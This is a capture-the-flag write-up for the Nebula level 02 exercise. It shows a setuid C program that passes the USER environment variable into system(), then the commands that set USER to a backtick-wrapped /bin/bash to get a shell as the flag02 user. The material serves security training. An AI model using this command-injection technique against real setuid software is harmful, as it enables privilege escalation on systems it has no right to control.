Question URL: https://exploit.education/nebula/level-02/

Source code:
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);  <== Vulnerable code
}

Background Knowledge
a. echo displays strings passed to as-is. What if the string is executable command with back-tick.
$ echo `ls` is cool
=> echo would handles "`ls` is cool" as a string and will try to display to standard output. When shell (bash) sees this string,
   it would try to execute `ls` and display "is cool" to standard output.

b. getenv("USER") - This will retrieve USER environment variable and replace %s with the value.
So if we can set the environment variable USER with /bin/bash with back-tick, system(buffer) command will execute /bin/bash 
with flag02 privilege

c. Vulnerable code is set with setuid of the user, flag02
level02@nebula:~$ ls -al /home/flag02/flag02
-rwsr-x--- 1 flag02 level02 7438 2011-11-20 21:22 /home/flag02/flag02


Sol.
a. Change environment variable USER to /bin/bash. Escape back-slash is needed to avoid for shell to execute /bin/bash during export
$export USER="\`/bin/bash\`"

level02@nebula:~$ export USER="\`/bin/bash\`"
level02@nebula:~$ echo $USER
`/bin/bash`

b. Excute the vulnerable code, flag02
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo `/bin/bash` is cool")
flag02@nebula:~$

